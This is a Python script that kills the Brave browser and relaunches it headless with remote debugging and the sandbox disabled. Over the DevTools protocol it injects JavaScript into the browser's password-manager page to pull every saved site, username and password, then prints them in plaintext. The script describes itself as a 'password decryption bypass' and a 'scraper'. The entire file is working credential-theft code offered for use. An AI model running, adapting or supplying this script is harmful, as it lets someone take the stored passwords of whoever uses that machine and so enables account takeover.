import os, subprocess, time, requests, json, websocket

# Using the path you confirmed from Task Manager
BRAVE_PATH = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
USER_DATA_DIR = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")

def get_brave_passwords_plaintext():
    print("[*] Launching v20 Password Decryption Bypass...")
    # Kill any existing Brave processes to unlock the database
    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")
    time.sleep(2)

    # Launching with specific flags to allow the internal API to talk to us
    cmd = (
        f'"{BRAVE_PATH}" '
        f'--remote-debugging-port=9222 '
        f'--user-data-dir="{USER_DATA_DIR}" '
        f'--remote-allow-origins=* '
        f'--headless '
        f'--no-sandbox '
        f'--disable-extensions'
    )
    subprocess.Popen(cmd, shell=True)
    time.sleep(8) 

    try:
        response = requests.get("http://localhost:9222/json")
        ws_url = response.json()[0]['webSocketDebuggerUrl']
        ws = websocket.create_connection(ws_url)

        # Step 1: Navigate to the password manager page
        ws.send(json.dumps({"id": 1, "method": "Page.navigate", "params": {"url": "chrome://password-manager/passwords"}}))
        time.sleep(5) 

        # Step 2: Inject JS to scrape the list
        # We target 'urls.shown', 'username', and the decrypted 'password'
        js_code = """
        new Promise((resolve) => {
            chrome.passwordsPrivate.getSavedPasswordList((list) => {
                resolve(list);
            });
        });
        """
        
        print("[*] Injecting Scraper into signed browser context...")
        ws.send(json.dumps({
            "id": 2, 
            "method": "Runtime.evaluate", 
            "params": {"expression": js_code, "awaitPromise": True, "returnByValue": True}
        }))
        
        # Loop until we get the result for ID 2
        while True:
            res = json.loads(ws.recv())
            if res.get("id") == 2:
                # This is the list of password objects
                pass_list = res.get('result', {}).get('result', {}).get('value', [])
                break
        
        ws.close()
        return pass_list

    except Exception as e:
        print(f"[-] Bypass failed: {e}")
        return []

if __name__ == "__main__":
    passwords = get_brave_passwords_plaintext()
    
    if passwords:
        print(f"\n{'SITE':<40} | {'USERNAME':<20} | {'PASSWORD'}")
        print("-" * 80)
        for entry in passwords:
            # Inside the Brave API, the site is often in 'urls.shown'
            site = entry.get('urls', {}).get('shown', 'Unknown Site')
            user = entry.get('username', 'Unknown User')
            
            # The browser might return 'password' as an empty string if 
            # Windows Security (PIN) is triggered. 
            password = entry.get('password', '')
            
            if not password:
                password = "[PROTECTED BY WINDOWS HELLO]"

            print(f"{site:<40} | {user:<20} | {password}")
    else:
        print("[-] No passwords found or extraction blocked.")
    
    # Cleanup
    os.system("taskkill /F /IM brave.exe /T >nul 2>&1")